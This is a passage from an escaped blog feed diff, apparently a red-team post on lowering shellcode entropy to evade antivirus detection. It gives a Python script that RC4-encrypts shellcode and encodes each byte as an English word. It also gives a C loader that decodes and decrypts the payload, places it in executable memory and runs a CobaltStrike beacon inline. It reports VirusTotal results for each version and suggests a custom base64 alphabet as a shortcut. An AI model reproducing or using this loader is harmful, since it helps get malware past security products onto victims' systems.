class=&quot;s&quot;&gt;'Wake'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Walk'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Wall'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Want'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Warn'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Wash'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Wear'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Week'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'When'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Wide'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Wife'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Will'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Wind'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Wine'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Wish'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Wood'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Word'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Work'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Year'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shuffle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ascii_strings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;output_file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;shellcode.h&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;raw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;rb&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;arc4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ARC4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;vinny&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;arc4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;encoded&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ascii_strings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;w&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;fh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'''const char* strings[] = {{ &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;{}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; }};
+const int length = {};
+'''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;, &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ascii_strings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]),&lt;/span&gt;
+        &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;', 0x'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encoded&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now we have the shellcode in an encoded format, we can unencode, unencrypt and inline execute it again (in a similar way to our control):&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;int get_index(char * find) {
+    int index = 0;
+    for (int i = 0; i &amp;lt; sizeof(strings) / sizeof(strings[0]); i++) {
+        if (strcmp(find, strings[i]) == 0) {
+            return index;
+        }
+        index++;
+    }
+    return -1;
+}
+
+int main() {
+    int string_length = 5;
+    unsigned char* ciphertext = (unsigned char*)malloc(length);
+    unsigned char* plaintext = (unsigned char*)malloc(length);
+    LPVOID mem = VirtualAlloc(NULL, length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+    if (ciphertext &amp;amp;&amp;amp; plaintext &amp;amp;&amp;amp; mem){
+        for (int i = 0; i &amp;lt; length; i++) {
+            *(ciphertext + i) = get_index((char*)(encoded + (i * string_length)));
+        }
+
+        RC4_init(&quot;vinny&quot;);
+        RC4_decrypt(ciphertext, plaintext, length);
+        memcpy(mem, plaintext, length);
+        ((void (*)(void))mem)();
+
+        free(ciphertext);
+        free(plaintext);
+    }
+    return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;We can again upload the resulting binary to &lt;a href=&quot;https://www.virustotal.com/gui/file/4da437ccf9b333d57c62fb66f24cd6d0c7c39da44f602163fd537a776684e8b0/details&quot;&gt;VirusTotal&lt;/a&gt; and compare. The results are similarly concerning, with “17 security vendors and 1 sandbox flagg(ing) this file as malicious”. The detections are now also more generic with labels of “Unsafe” or “Malicious”. Which makes sense - the CobaltStrike beacon signature is no longer evident in the file.&lt;/p&gt;
+
+&lt;p&gt;If we take a look at the entropy of our new shellcode:
+&lt;a href=&quot;/assets/images/Pasted image 20220607100132.png&quot; data-lightbox=&quot;1&quot;&gt;&lt;img src=&quot;/assets/images/Pasted image 20220607100132.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;We can see that with the substitution, the new entropy of 4.616721721844255 is much more representative of standard English text, and no longer appears to be encrypted or compressed data.&lt;/p&gt;
+
+&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
+&lt;p&gt;So we have created 2 versions of our binary which executes an inline CobaltStrike payload. The raw control version was detected by 27 vendors, while the encrypted and encoded version with lower entropy shellcode was detected by 17 vendors (in retrospect, the raw version should have been encrypted too as a better control.. but we are already in the conclusion so it’s too late to change that now..).&lt;/p&gt;
+
+&lt;p&gt;It’s difficult to make a concrete interpretation of the results due to the number of potential data points, but it’s fair to assume that at least 10 vendors may be using entropy (or known shellcode signatures) as some indicator of binary ‘maliciousness’. With the same inline execution process and final shellcode behaviour, 10 fewer vendors identified the lower entropy shellcode as suspicious - even though the end execution result (of a CobaltStrike beacon) was the same.&lt;/p&gt;
+
+&lt;p&gt;Will lower entropy (and encryption) make your loader fully undetectable?&lt;/p&gt;
+
+&lt;p&gt;No.&lt;/p&gt;
+
+&lt;p&gt;But it won’t make it worse either.&lt;/p&gt;
+
+&lt;h2 id=&quot;side-note&quot;&gt;Side note&lt;/h2&gt;
+&lt;p&gt;Oh, and if you’re just looking for close enough - base64 encoding high entropy shellcode will give a similar result due to the way base64 encoding works (and if you’re worried about automated analysis of base64 encoded blobs, you could use a custom character set too):&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/assets/images/Pasted image 20220607101000.png&quot; data-lightbox=&quot;1&quot;&gt;&lt;img src=&quot;/assets/images/Pasted image 20220607101000.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+</content>
+ </entry>
  
  <entry>
    <title>Solving CTF challenges with DLL injection</title>
